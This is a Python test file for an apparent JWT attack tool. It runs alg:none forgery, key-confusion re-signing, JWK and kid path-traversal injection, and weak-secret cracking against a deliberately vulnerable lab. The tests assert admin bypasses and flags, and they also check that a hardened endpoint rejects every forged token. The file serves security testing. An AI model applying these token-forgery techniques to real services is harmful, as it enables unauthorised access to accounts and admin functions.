"""Each tanuki attack, run against the matching lab endpoint.

These exercise the real forge → replay path against the live (deliberately
vulnerable) lab, and assert the expected verdict per endpoint — including the
all-important no-false-positives check on /api/secure.
"""
import requests

from tanuki import (
    JWT,
    suggest_modifications,
    attack_alg_none,
    attack_key_confusion,
    attack_jwk_injection,
    attack_kid_injection,
    resign_hs256,
    replay,
    classify,
)


def _none_token(jwt, new_payload):
    return dict(attack_alg_none(jwt, new_payload))["alg:none"]


# ── /api/admin : access bypass via alg:none AND key confusion ──────────────────
def test_admin_bypass_via_alg_none(base_url, rs256_token):
    jwt = JWT(rs256_token)
    new_payload, _ = suggest_modifications(jwt.payload)
    url = base_url + "/api/admin"

    base = replay(url, rs256_token)
    assert base[0] == 403  # low-priv token is forbidden at the admin gate

    res = replay(url, _none_token(jwt, new_payload))
    kind, text, _ = classify(base, res)
    assert kind == "bypass", text
    assert res[0] == 200
    assert "FLAG{admin_panel_unlocked}" in requests.get(
        url, headers={"Authorization": "Bearer " + _none_token(jwt, new_payload)}
    ).text


def test_admin_bypass_via_key_confusion(base_url, rs256_token, public_key_pem):
    jwt = JWT(rs256_token)
    new_payload, _ = suggest_modifications(jwt.payload)
    url = base_url + "/api/admin"
    base = replay(url, rs256_token)

    kc_tokens, err = attack_key_confusion(jwt, new_payload, public_key_pem)
    assert err is None
    assert kc_tokens, "no key-confusion tokens produced"

    # at least one pubkey byte-representation must land as an access bypass
    bypassed = [
        label for label, tok in kc_tokens if classify(base, replay(url, tok))[0] == "bypass"
    ]
    assert bypassed, "no key-confusion variant bypassed /api/admin"
    # and it must be an HS256-signed one (the confusion), not RS256
    assert any("HS256" in label for label in bypassed)


# ── /api/user : signature forgery changes the response (role widgets) ──────────
def test_user_endpoint_bypass(base_url, rs256_token):
    jwt = JWT(rs256_token)
    new_payload, _ = suggest_modifications(jwt.payload)
    url = base_url + "/api/user"

    base = replay(url, rs256_token)
    assert base[0] == 200  # user endpoint accepts the low-priv token

    res = replay(url, _none_token(jwt, new_payload))
    kind, text, _ = classify(base, res)
    assert kind == "bypass", text  # admin widgets appear -> length changes


# ── /api/hs256 : crack the weak secret, re-sign as admin, get accepted ─────────
def test_hs256_cracked_and_resigned_accepted(base_url, hs256_token, wordlist_path):
    from tanuki import crack_secret

    jwt = JWT(hs256_token)
    secret, method = crack_secret(jwt, wordlist_path, prefer="builtin")
    assert secret == "secret123"

    new_payload, _ = suggest_modifications(jwt.payload)
    forged = resign_hs256(jwt, new_payload, secret)
    r = requests.get(base_url + "/api/hs256", headers={"Authorization": "Bearer " + forged})
    assert r.status_code == 200
    assert "FLAG{hs256_secret_cracked}" in r.text


# ── /api/kid : alg:none AND kid path-traversal bypass ──────────────────────────
def test_kid_bypass_via_alg_none(base_url, kid_token):
    jwt = JWT(kid_token)
    new_payload, _ = suggest_modifications(jwt.payload)
    url = base_url + "/api/kid"
    base = replay(url, kid_token)

    res = replay(url, _none_token(jwt, new_payload))
    kind, text, _ = classify(base, res)
    assert kind == "bypass", text


def test_kid_bypass_via_traversal(base_url, kid_token):
    jwt = JWT(kid_token)
    new_payload, _ = suggest_modifications(jwt.payload)
    url = base_url + "/api/kid"
    base = replay(url, kid_token)

    kid_results, err = attack_kid_injection(jwt, new_payload)
    assert err is None
    trav = [tok for label, tok in kid_results if "dev/null" in label]
    assert trav, "no kid traversal token produced"

    res = replay(url, trav[0])
    kind, text, _ = classify(base, res)
    assert kind == "bypass", text
    assert "FLAG{kid_traversal}" in requests.get(
        url, headers={"Authorization": "Bearer " + trav[0]}
    ).text


# ── /api/secure : EVERY forged token must be rejected (no false positives) ─────
def test_secure_rejects_all_forged(base_url, rs256_token, public_key_pem):
    jwt = JWT(rs256_token)
    new_payload, _ = suggest_modifications(jwt.payload)
    url = base_url + "/api/secure"

    forged = []
    forged += attack_alg_none(jwt, new_payload)  # all case variants
    kc, _ = attack_key_confusion(jwt, new_payload, public_key_pem)
    forged += kc
    jwk_tok, _ = attack_jwk_injection(jwt, new_payload)
    if jwk_tok:
        forged.append(("jwk-injection", jwk_tok))
    kid_res, _ = attack_kid_injection(jwt, new_payload)
    forged += kid_res
    # even an HS256 token re-signed with the *correct* weak secret must be rejected
    # here, because /api/secure pins the algorithm to RS256
    forged.append(("hs256-resigned", resign_hs256(jwt, new_payload, "secret123")))

    assert len(forged) >= 8, "expected a broad forged-token set"
    for label, tok in forged:
        status = replay(url, tok)[0]
        assert status in (401, 403), f"/api/secure wrongly accepted {label!r} (HTTP {status})"

    # sanity: the genuine token is still accepted (so we're really hitting the app)
    assert replay(url, rs256_token)[0] == 200
